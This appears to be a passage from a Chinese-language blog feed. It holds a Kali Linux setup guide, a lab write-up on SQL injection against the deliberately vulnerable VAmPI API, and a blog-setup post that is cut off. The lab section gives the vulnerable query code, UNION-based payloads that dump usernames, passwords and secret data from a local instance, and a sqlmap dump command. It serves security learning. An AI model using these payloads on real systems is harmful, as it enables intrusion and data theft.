class="line">unzip -o docker.zip</span><br><span class="line">docker-compose pull</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å®Œæˆåè®¿é—® <code>https://kali-ip-address:5003</code>, é»˜è®¤è´¦å·å¯†ç ä¸º <code>admin/arlpass</code></p><p>å®‰è£…å®Œæˆå <code>docker images</code> å°†ä¼šæ–°å¢å¦‚ä¸‹å‡ ä¸ªé•œåƒæ–‡ä»¶</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">docker images          </span><br><span class="line">REPOSITORY    TAG                        IMAGE ID       CREATED         SIZE</span><br><span class="line">tophant/arl   latest                     408fde22de0e   2 weeks ago     817MB</span><br><span class="line">mongo         4.0.27                     f83cda2e164c   18 months ago   400MB</span><br><span class="line">rabbitmq      3.8.19-management-alpine   27a2c6b36827   22 months ago   156MB</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•-fcitx"><a href="#å®‰è£…ä¸­æ–‡è¾“å…¥æ³•-fcitx" class="headerlink" title="å®‰è£…ä¸­æ–‡è¾“å…¥æ³• (fcitx)"></a>å®‰è£…ä¸­æ–‡è¾“å…¥æ³• (fcitx)</h3><ol><li>è¾“å…¥ <code>sudo apt install fcitx</code> å®‰è£… fcitx è¾“å…¥æ³•æ¡†æ¶</li><li>åœ¨ç»ˆç«¯è¾“å…¥ <code>im-config</code> é€‰æ‹© fcitx ä½œä¸ºé»˜è®¤è¾“å…¥æ³•</li><li>è¾“å…¥ <code>sudo apt install fcitx-googlepinyin</code> å®‰è£…è°·æ­Œæ‹¼éŸ³è¾“å…¥æ³•</li><li>è¾“å…¥ <code>reboot</code> é‡å¯ Kali Linux</li><li>å®‰è£…å®Œæˆåå¯ä»¥åœ¨å³ä¸Šè§’æ‰“å¼€é…ç½®è®¾ç½®å­—ä½“å¤§å°ç­‰åå¥½è®¾ç½®</li></ol><h3 id="å®‰è£…-Clash-ä»£ç†å·¥å…·"><a href="#å®‰è£…-Clash-ä»£ç†å·¥å…·" class="headerlink" title="å®‰è£… Clash ä»£ç†å·¥å…·"></a>å®‰è£… Clash ä»£ç†å·¥å…·</h3><ol><li>è¿›å…¥ <a href="https://github.com/Dreamacro/clash/">https://github.com/Dreamacro/clash/</a> ä¸‹è½½å¯¹åº”æ“ä½œç³»ç»Ÿ <code>.tar.gz</code> ç»“å°¾çš„ Clash å‹ç¼©åŒ…, å°†å‹ç¼©åŒ…ä¸­ clash æ–‡ä»¶å¤¹è§£å‹è‡³ç”¨æˆ·æ ¹ç›®å½•</li><li>è¿›å…¥ <a href="https://github.com/Z-Siqi/Clash-for-Windows_Chinese/releases/tag/CFW-V0.20.23_CN">https://github.com/Z-Siqi/Clash-for-Windows_Chinese&#x2F;releases&#x2F;tag&#x2F;CFW-V0.20.23_CN</a> ä¸‹è½½ <code>app.asar</code> æ±‰åŒ–è¡¥ä¸, å¹¶ç§»åŠ¨åˆ° <code>clash/resources</code> ç›®å½•</li><li>å¯¼å…¥é…ç½®æ–‡ä»¶: è¿›å…¥ <code>~/.config/clash</code> ç›®å½•, å°† <code>.yaml</code> ä»£ç†é…ç½®æ–‡ä»¶æ‹–å…¥å³å¯</li></ol><h3 id="å®‰è£…-Go-è¯­è¨€ç¯å¢ƒ"><a href="#å®‰è£…-Go-è¯­è¨€ç¯å¢ƒ" class="headerlink" title="å®‰è£… Go è¯­è¨€ç¯å¢ƒ"></a>å®‰è£… Go è¯­è¨€ç¯å¢ƒ</h3><ol><li>è¿›å…¥ go å®˜ç½‘ <a href="https://go.dev/dl/">https://go.dev/dl/</a>, æœç´¢å¯¹åº”å…³é”®å­— (<code>arm</code> æˆ– <code>amd</code>) æ‰¾åˆ° <code>.tar.gz</code> ç»“å°¾çš„å‹ç¼©åŒ…</li><li>è§£å‹åå°† go æ–‡ä»¶å¤¹ç§»åŠ¨åˆ° <code>/usr/bin</code> ç›®å½•</li><li>ä½¿ç”¨ <code>open ~/.zshrc</code> æ‰“å¼€ zsh é…ç½®æ–‡ä»¶, æ·»åŠ å¦‚ä¸‹å†…å®¹, ä¿å­˜åé€€å‡º <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export GOPATH=/usr/bin/go</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure></li><li>å‘½ä»¤è¡Œè¾“å…¥ <code>source ~/.zshrc</code> é‡æ–°åŠ è½½ zsh é…ç½®æ–‡ä»¶å³å¯</li></ol><h3 id="æ›´æ–°-Kali-Linux"><a href="#æ›´æ–°-Kali-Linux" class="headerlink" title="æ›´æ–° Kali Linux"></a>æ›´æ–° Kali Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰ç‰ˆæœ¬</span></span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux secuuki 6.1.0-kali5-arm64 <span class="comment">#1 SMP Debian 6.1.12-1kali2 (2023-02-23) aarch64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°ç‰ˆæœ¬</span></span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt full-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ç³»ç»Ÿ</span></span><br><span class="line">$ reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ›´æ–°åç‰ˆæœ¬å·</span></span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux secuuki 6.1.0-kali9-arm64 <span class="comment">#1 SMP Debian 6.1.27-1kali1 (2023-05-12) aarch64 GNU/Linux</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å„æ–‡ä»¶ä¸‹è½½åœ°å€&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Fusion ä¸‹è½½åœ°å€: &lt;a href=&quot;https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal</summary>
      
    
    
    
    <category term="ops" scheme="https://blog.uuki.moe/categories/ops/"/>
    
    
    <category term="Kali Linux" scheme="https://blog.uuki.moe/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>Lab - VAmPI - SQL Injection</title>
    <link href="https://blog.uuki.moe/2023/05/31/VAmPI-sql-injection/"/>
    <id>https://blog.uuki.moe/2023/05/31/VAmPI-sql-injection/</id>
    <published>2023-05-30T19:50:16.000Z</published>
    <updated>2023-06-12T01:31:35.217Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/erev0s/VAmPI">VAmPI</a> æ˜¯ä¸€ä¸ªå…·æœ‰ OWASP Top 10 æ¼æ´çš„ REST API çš„ç¨‹åº, å¯ä»¥é€šè¿‡ä¸€ä¸ªå¼€å…³æ¥æ§åˆ¶ API æ˜¯å¦æ˜“å—æ”»å‡», å¯ä»¥ç”¨äºæµ‹è¯•ã€å­¦ä¹ ã€æ•™å­¦çš„ç›®çš„ã€‚åœ¨ <a href="https://erev0s.com/blog/vampi-vulnerable-api-security-testing/">https://erev0s.com/blog/vampi-vulnerable-api-security-testing/</a> å¯ä»¥çœ‹åˆ°æ›´åŠ å…¨é¢çš„ä»‹ç»ã€‚</p><span id="more"></span><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æœ‰ä¸‰ç§æ­å»ºç¯å¢ƒçš„æ–¹å¼, åˆ†åˆ«æ˜¯ Python, docker, docker-composeã€‚æœ¬æ–‡ä½¿ç”¨ Python æ­å»ºã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/erev0s/VAmPI.git</span><br><span class="line"><span class="built_in">cd</span> VAmPI/</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>å°†ç¯å¢ƒæ‹‰å€’æœ¬åœ°åå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>python3 app.py</code> è¿è¡Œã€‚åœ¨ <code>openapi_specs</code> ç›®å½•ä¸‹æœ‰ä¸€ä¸ª <code>openapi3.yml</code>, å¯ä»¥ç”¨äºåœ¨ <a href="https://editor.swagger.io/">swagger editor</a> æˆ– Postman ç­‰å·¥å…·ç”Ÿæˆ API æ–‡æ¡£ã€‚</p><p>ä¸ºäº†é¿å…ä¸è¾ƒæ–°ç‰ˆæœ¬çš„ MacOS AirPlay Receiver çš„ç«¯å£å†²çª, éœ€è¦ä¿®æ”¹ <code>app.py</code> ä¸ <code>openapi3.yml</code> å†…çš„ç«¯å£å·ä¸º <code>5001</code></p><p>ä½¿ç”¨ <code>python3 app.py</code> å¯åŠ¨æœåŠ¡åæµè§ˆå™¨è®¿é—® <code>http://10.0.0.100:5001/</code>ã€‚åœ¨ Postman å¯¼èˆªæ é€‰æ‹© <strong>File</strong> -&gt; <strong>Import</strong> å¯¼å…¥ <code>openapi3.yml</code> é…ç½®æ–‡ä»¶å¼€å§‹æµ‹è¯•ã€‚</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>å¯¼è‡´ SQL æ³¨å…¥çš„æŸ¥è¯¢ç”¨æˆ·åæ¥å£ä¸º <code>/users/v1/&#123;username&#125;</code>ã€‚åŠŸèƒ½å‡½æ•° <code>get_user</code> ä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> vuln:  <span class="comment"># SQLi Injection</span></span><br><span class="line">        user_query = <span class="string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27;&quot;</span></span><br><span class="line">        query = db.session.execute(text(user_query))</span><br><span class="line">        ret = query.fetchone()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            fin_query = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#x27;</span> % (ret[<span class="number">1</span>], ret[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fin_query = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fin_query = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">return</span> fin_query</span><br></pre></td></tr></table></figure><p>é¶åœº SQL ç¯å¢ƒä½¿ç”¨çš„æ˜¯ SQLite æ•°æ®åº“, éœ€è¦æ³¨æ„ SQLite æ²¡æœ‰åº“è¿™ä¸ªæ¦‚å¿µçš„, æŸ¥è¯¢è¯­å¥ä¸­ä¸éœ€è¦æŒ‡å®šæ•°æ®åº“ã€‚</p><p>æŸ¥è¯¢è¯­å¥ <code>user_query = f&quot;SELECT * FROM users WHERE username = &#39;&#123;username&#125;&#39;&quot;</code> ä¸º<strong>å­—ç¬¦å‹æŸ¥è¯¢</strong>, æ³¨å…¥æ—¶ä½¿ç”¨å•å¼•å·é—­åˆã€‚</p><p>æŸ¥è¯¢ç»“æœ <code>fin_query = &#39;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#39; % (ret[1], ret[3])</code> ä½¿ç”¨é”® 1 å’Œ 3 çš„ä½ç½®ä½œä¸ºå“åº”ç»“æœ, æ•…<strong>æ•°æ®å›æ˜¾ä½</strong>åœ¨ 2 å’Œ 4ã€‚</p><h3 id="ç¡®å®šæ³¨å…¥ç‚¹"><a href="#ç¡®å®šæ³¨å…¥ç‚¹" class="headerlink" title="ç¡®å®šæ³¨å…¥ç‚¹"></a>ç¡®å®šæ³¨å…¥ç‚¹</h3><p>å½“ç”¨æˆ·å­˜åœ¨å°†è¿”å› <code>username</code>, <code>email</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>å½“ç”¨æˆ·ä¸å­˜åœ¨ <code>message</code> å°†è¿”å› <code>User not found</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fail&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å•å¼•å· <code>&#39;</code> æŠ¥é”™, æ·»åŠ æ³¨é‡Šç¬¦å·åé¡µé¢æ­£å¸¸æ˜¾ç¤º, åˆ¤æ–­æ³¨å…¥ç‚¹å­˜åœ¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:5001/users/v1/1       # æ­£å¸¸</span><br><span class="line">http://localhost:5001/users/v1/1&#x27;      # æŠ¥é”™</span><br><span class="line">http://localhost:5001/users/v1/1&#x27; --+  # æ­£å¸¸</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-sql-injection/image-20230601_061815.png" class="lazyload" data-srcset="/../assets/VAmPI-sql-injection/image-20230601_061815.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>åœ¨è¿™é‡Œé¡µé¢å›æ˜¾äº†æŸ¥è¯¢è¯­å¥ <code>SELECT * FROM users WHERE username = &#39;1&#39;&#39;</code> æ˜ç¡®æŒ‡å‡ºè¿™æ˜¯å­—ç¬¦å‹çš„æ³¨å…¥ç‚¹, çœç•¥ <strong><a href="https://pentestnote.uuki.moe/pentesting-web/sql-injection">ç¡®å®šé—­åˆæ–¹å¼</a></strong> è¿™ä¸€æ­¥éª¤</p><h3 id="åˆ¤æ–­æŸ¥è¯¢ç»“æœåˆ—æ•°"><a href="#åˆ¤æ–­æŸ¥è¯¢ç»“æœåˆ—æ•°" class="headerlink" title="åˆ¤æ–­æŸ¥è¯¢ç»“æœåˆ—æ•°"></a>åˆ¤æ–­æŸ¥è¯¢ç»“æœåˆ—æ•°</h3><p>ä½¿ç”¨ ORDER BY è¯­å¥åˆ¤æ–­æŸ¥è¯¢ç»“æœåˆ—æ•°ã€‚</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 4 --+  # æ­£å¸¸</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 5 --+  # æ­£å¸¸</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 6 --+  # æŠ¥é”™</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-sql-injection/image-20230601_063959.png" class="lazyload" data-srcset="/../assets/VAmPI-sql-injection/image-20230601_063959.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>å½“æ’åºè¯­å¥ä¸º <code>ORDER BY 6</code> æ—¶, é¡µé¢å°†æŠ¥é”™, åˆ¤æ–­æŸ¥è¯¢ç»“æœä¸º 5 åˆ—ã€‚</p><h3 id="åˆ¤æ–­æ•°æ®å›æ˜¾ä½"><a href="#åˆ¤æ–­æ•°æ®å›æ˜¾ä½" class="headerlink" title="åˆ¤æ–­æ•°æ®å›æ˜¾ä½"></a>åˆ¤æ–­æ•°æ®å›æ˜¾ä½</h3><p>ä½¿ç”¨ <code>UNION</code> è”åˆæŸ¥è¯¢åˆ¤æ–­æ•°æ®å›æ˜¾ä½ã€‚</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,2,3,4,5 --+</span><br></pre></td></tr></table></figure><p>æœ¬èº« <code>username = 1</code> ç»“æœå¹¶ä¸å­˜åœ¨, æœåŠ¡å™¨å°†ä¼šè¿”å› UNION æŸ¥è¯¢è¯­å¥çš„ç»“æœ, å“åº”ç»“æœä¸­åŒ…å« 2, 4 , è¯´æ˜ 2 å’Œ 4 çš„ä½ç½®æ˜¯æ•°æ®å›æ˜¾ä½ã€‚</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯"><a href="#æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯"></a>æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯</h3><p>ä½¿ç”¨ sqlite æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯å‡½æ•° <code>sqlite_version()</code> æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,sqlite_version(),3,4,5 FROM sqlite_schema --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601101335</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,sqlite_version(),3,4,5%20FROM%20sqlite_schema%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.39.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="æ£€ç´¢æ•°æ®åº“æ•°æ®"><a href="#æ£€ç´¢æ•°æ®åº“æ•°æ®" class="headerlink" title="æ£€ç´¢æ•°æ®åº“æ•°æ®"></a>æ£€ç´¢æ•°æ®åº“æ•°æ®</h3><h4 id="æŸ¥è¡¨å"><a href="#æŸ¥è¡¨å" class="headerlink" title="æŸ¥è¡¨å"></a>æŸ¥è¡¨å</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type=&#x27;table&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601102601</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,group_concat(tbl_name),3,4,5%20FROM%20sqlite_master%20WHERE%20type=&#x27;table&#x27;%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;users,books&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="æŸ¥å­—æ®µ"><a href="#æŸ¥å­—æ®µ" class="headerlink" title="æŸ¥å­—æ®µ"></a>æŸ¥å­—æ®µ</h4><blockquote><p>æ³¨æ„, è¿™é‡Œ <code>pragma_table_info(&#39;users&#39;)</code> ç”¨äºè·å–æŒ‡å®šè¡¨çš„åˆ—ä¿¡æ¯ï¼Œå…¶ä¸­<code>name</code>æ˜¯åˆ—åçš„å­—æ®µã€‚</p></blockquote><p>æŸ¥è¯¢ <code>users</code> è¡¨æ‰€æœ‰å­—æ®µ</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,username,password,email,admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ <code>books</code> è¡¨æ‰€æœ‰å­—æ®µ</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;books&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,book_title,secret_content,user_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ•°æ®"><a href="#æŸ¥æ•°æ®" class="headerlink" title="æŸ¥æ•°æ®"></a>æŸ¥æ•°æ®</h4><p>æŸ¥è¯¢ <code>users</code> è¡¨ä¸‹ <code>username</code> å’Œ <code>password</code> å­—æ®µçš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,username,password)),3,4,5 FROM &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name1@pass1,name2@pass2,admin@pass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ <code>books</code> è¡¨ä¸‹ <code>book_title</code> å’Œ <code>secret_content</code> å­—æ®µçš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,book_title,secret_content)),3,4,5 FROM &#x27;books&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bookTitle19@secret for bookTitle19,bookTitle56@secret for bookTitle56,bookTitle8@secret for bookTitle8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>ä½¿ç”¨ <code>sqlmap</code> å¯¹ URL ä¸­çš„è·¯å¾„å‚æ•°è¿›è¡Œæ³¨å…¥æµ‹è¯•æ—¶, å¯ä»¥ä½¿ç”¨æ˜Ÿå· <code>*</code> è¡¨ç¤ºè·¯å¾„å‚æ•°çš„ä½ç½®, ä½¿ç”¨ <code>sqlmap -u &quot;http://127.0.0.1:5001/users/v1/*&quot; --dump</code> åŒæ ·å¯ä»¥æ£€ç´¢å‡ºæ•°æ®åº“å†…æ‰€æœ‰çš„æ•°æ®ã€‚</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/erev0s/VAmPI&quot;&gt;VAmPI&lt;/a&gt; æ˜¯ä¸€ä¸ªå…·æœ‰ OWASP Top 10 æ¼æ´çš„ REST API çš„ç¨‹åº, å¯ä»¥é€šè¿‡ä¸€ä¸ªå¼€å…³æ¥æ§åˆ¶ API æ˜¯å¦æ˜“å—æ”»å‡», å¯ä»¥ç”¨äºæµ‹è¯•ã€å­¦ä¹ ã€æ•™å­¦çš„ç›®çš„ã€‚åœ¨ &lt;a href=&quot;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&quot;&gt;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&lt;/a&gt; å¯ä»¥çœ‹åˆ°æ›´åŠ å…¨é¢çš„ä»‹ç»ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="sec" scheme="https://blog.uuki.moe/categories/sec/"/>
    
    
    <category term="Pentesting API" scheme="https://blog.uuki.moe/tags/Pentesting-API/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.uuki.moe/2023/05/28/hello-world/"/>
    <id>https://blog.uuki.moe/2023/05/28/hello-world/</id>
    <published>2023-05-27T16:00:00.000Z</published>
    <updated>2023-05-28T12:49:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to my blog. ğŸ‘‹ è¿™æ˜¯ç¬¬ä¸€ä¸ªå¸–å­, è®°å½•äº†è¿™ä¸ªç«™ç‚¹çš„è¯ç”Ÿã€‚</p><span id="more"></span><details blue><summary> TimeLog </summary>              <div class='content'>              <div class="timeline"><div class="timenode"><div class="meta"><p><p>2023-05-28</p></p></div><div class="body"><p>ç¼–è¾‘æ–‡ç« , å‘å¸ƒåšå®¢ (<a href="https://uuki.blog.moe/">https://uuki.blog.moe</a>)</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-29</p></p></div><div class="body"><p>è¡¥å……<a href="#2-%E9%9B%86%E6%88%90-Obsidian">é›†æˆ Obsidian</a> éƒ¨åˆ†å†…å®¹</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-30</p></p></div><div class="body"><ol><li><p>å…³é—­å…‰æ ‡æ ·å¼</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">custom_css:</span></span><br><span class="line"><span class="attr">cursor:</span></span><br><span class="line"><span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li><li><p>å…³é—­å¹³æ»‘æ»šåŠ¨</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">scroll_smooth:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li></ol></div></div></div>              </div>            </details><p><strong>å¸¸ç”¨é“¾æ¥</strong></p><ul><li>Volantis ä¸»é¢˜æ–‡æ¡£: <a href="https://volantis.js.org/">https://volantis.js.org/</a></li></ul><h2 id="1-åˆå§‹åŒ–-Hexo-blog"><a href="#1-åˆå§‹åŒ–-Hexo-blog" class="headerlink" title="1. åˆå§‹åŒ– Hexo blog"></a>1. åˆå§‹åŒ– Hexo blog</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## åˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line">hexo init</span><br><span class="line">git init .</span><br><span class="line"></span><br><span class="line"><span class="comment">## å®‰è£…ä¸»é¢˜</span></span><br><span class="line"><span class="comment"># https://github.com/volantis-x/hexo-theme-volantis/</span></span><br><span class="line">git submodule add https://github.com/volantis-x/hexo-theme-volantis.git themes/volantis</span><br><span class="line"><span class="built_in">cp</span> themes/volantis/_config.yml ./_config.volantis.yml</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶</h3><figure class="highlight diff"><figcaption><span>_config.volantis.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ 131 - navbar: # å¯¼èˆªæ </span></span><br><span class="line"><span class="deletion">- 171 - cover: # å¤´å›¾</span></span><br><span class="line"><span class="addition">+ 214 - pages: # 